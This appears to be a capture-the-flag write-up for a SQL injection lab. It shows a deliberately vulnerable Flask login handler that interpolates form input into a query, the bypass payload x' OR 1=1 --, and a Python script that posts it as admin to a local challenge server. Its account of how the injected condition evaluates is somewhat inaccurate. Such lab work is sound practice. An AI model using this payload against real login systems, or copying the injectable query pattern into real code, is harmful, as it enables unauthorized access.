## Exercise
The previous level's SQL injection was quite simple to pull off and still have a valid SQL query. This was, in part, because your injection happened at the very end of the query. In this level, however, your injection happens partway through, and there is (a bit) more of the SQL query afterwards. This complicates matters, because the query must remain valid despite your injection.

#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)


import sqlite3
import tempfile


class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result


db = TemporaryDB()

# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")


@app.route("/portal", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("account-name")
    password = flask.request.form.get("pass")
    if not username:
        flask.abort(400, "Missing `account-name` form parameter")
    if not password:
        flask.abort(400, "Missing `pass` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)


@app.route("/portal", methods=["GET"])

The server accepts GET and POST requests on /portal. It also runs a database with a guest and an admin user. The password for guest is "password" and for admin is unknown.
The database has a table called users with the columns username and password. We need to authenticate via post on /portal to receive our flag. Therefore we are SQL injecting a password.

### Injection
The SQL query:
```
SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'
```
Our inject:
```
SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'x' OR 1=1 --
```
This time there are other querys that are right after our inject therefore the -- at the end.
And for the authentication part:
(password = x) = false most probably
(1=1) = true.
password = x OR 1=1 -> true
Therefore this will return:
```
SELECT rowid, * FROM users WHERE username = 'admin' AND TRUE --
```
Our password string:
```
x' OR 1=1 --
```
Ok let's create our post request via python:
```
import requests as req

url = "http://challenge.localhost:80/portal"
data = {
        "account-name": "admin",
        "pass": "x' OR 1=1 --"
}
x = req.post(url, data)
print(x.text)
```
